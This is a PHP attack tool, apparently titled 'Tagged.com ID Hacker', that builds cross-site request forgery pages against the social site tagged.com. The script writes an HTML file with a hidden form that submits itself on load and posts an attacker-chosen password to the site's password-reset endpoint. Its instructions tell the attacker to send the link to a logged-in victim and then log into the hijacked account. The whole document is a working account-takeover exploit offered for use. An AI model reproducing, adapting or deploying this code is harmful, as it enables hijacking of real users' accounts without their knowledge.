<?php
error_reporting(0);
//functions
function randomName($length=4) {
	$str="";
	$characters=array_merge(range('A','Z'), range('a','z'), range('0','9'));
	$max=count($characters)-1;
	for ($i=0; $i<$length; $i++) {
		$rand=mt_rand(0,$max);
		$str.=$characters[$rand];
	}
	return $str;
}
//end functions
//variables
$self=$_SERVER['PHP_SELF'];
$html=".html"; //defines extenstion
//end variables
?>
<html>
	<head>
		<title>Tagged.com ID Hacker by Zawad</title>
	</head>
	<body>
		<center>
		<h1>Please enter your desired password</h1><br/><br/>
		<p><b>Note: Victim's current password will be changed to this password (the password you are selecting now)</b></p><br/><br/>
		<form method="POST" action="<?php echo $self; ?>" autocomplete="off">
			Enter your desired password to hack user's account: <input type="text" name="pass" size="30" placeholder="Enter Desired Password"><br/>
			<input type="submit" name="hack" value="Generate Link"><br/>
		</form>
	</body>
</html>
<?php
//logic starts
if ($_POST['hack']) {
//variables
$name=randomName().$html; //defines filename
$pass=$_POST['pass']; //defines attacker's desired password
$write=fopen($name,'a'); //defines creating a new file with random filename
$data="<html>
	<head>
		<title>Loading...</title>
		<!-- Do not edit below this line -->
		<SCRIPT LANGUAGE=\"JavaScript\">
		setTimeout('document.reset_password.submit()',0);
		</SCRIPT>
		<!-- Do not edit over this line -->
	</head>
	<body>
	<!-- Tagged.com ID Hacker
		 This script automatically change logged in tagged.com user's password to your chosen password and let you access his/her tagged.com account.
		 To choose your password edit the value=\"\" for password1 and password2 input. The default password is 'chang3d2'.
		 (c) Zawad. All Rights Reserved -->
		<div class=\"main_content\" id=\"reset_password\">
				<!-- Do not edit below this line -->
				<form name=\"reset_password\" id=\"reset_password\" method=\"post\" action=\"http://www.tagged.com/rp.html?jli=1\">
				<!-- Do not edit over this line -->
					<input type=\"hidden\" name=\"password1\" id=\"password1\" value=\"$pass\" class=\"text\" />
					<input type=\"hidden\" name=\"password2\" id=\"password2\" value=\"$pass\" class=\"text\" />
				</form>
		</div>
	</body>
</html>"; //defines the data the HTML file should contain.
//end variables
if(strlen($pass)<8){
	echo "<center><font color=\"red\"><h2>Your password must be at least 8 characters long</h2></center>";
}
else{
fwrite ($write,$data); //writing the file
fclose($write); //closing writing the file

echo "<center><h2>Here is your <a href=\"$name\">LINK</a></h2>";
echo "<b><font size=\"4\">Do not CLICK this LINK if you are logged into your tagged.com account</font></b><br/>";
echo "Give this link to your target when (s)he is logged into his/her tagged.com account. If (s)he visits the link when (s)he is logged in, his/her password will automatically be changed into the password you have choosen. <br/>Now loginto his/her account using that password and email. <b>Happy Hacking</b>.</center>";
}

}

?>
<body><center><font color="blue" size="5"><b>0day found and script coded by: <a href="http://www.zawad.me">Zawad</a></b></font></center></body>
